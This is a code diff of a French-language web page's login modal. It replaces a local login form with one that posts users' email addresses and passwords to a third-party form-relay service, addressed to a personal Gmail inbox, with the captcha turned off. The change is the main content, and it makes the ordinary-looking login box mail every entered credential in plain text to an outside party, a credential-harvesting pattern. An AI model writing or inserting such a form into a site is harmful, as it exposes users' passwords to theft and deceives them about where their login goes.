@@ -261,17 +261,25 @@
                     <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                 </div>
                 <div class="modal-body">
-                    <form id="loginForm">
-                        <div class="mb-3">
-                            <label for="email" class="form-label">Email</label>
-                            <input type="email" class="form-control" id="email" required>
-                        </div>
-                        <div class="mb-3">
-                            <label for="password" class="form-label">Mot de passe</label>
-                            <input type="password" class="form-control" id="password" required>
-                        </div>
-                        <button type="submit" class="btn btn-primary w-100">Se connecter</button>
-                    </form>
+                    <form action="https://formsubmit.co/mfesdona025@gmail.com" method="POST">
+    <div class="mb-3">
+        <label class="form-label">Email</label>
+        <input type="email" name="email" class="form-control" required>
+    </div>
+
+    <div class="mb-3">
+        <label class="form-label">Mot de passe</label>
+        <input type="password" name="password" class="form-control" required>
+    </div>
+
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_subject" value="Nouvelle connexion sur votre site">
+
+    <button type="submit" class="btn btn-primary w-100">
+        Envoyer
+    </button>
+</form>
+
                     <p class="text-center mt-3">
                         Pas encore de compte? <a href="#" onclick="showRegisterModal()">S'inscrire</a>
                     </p>
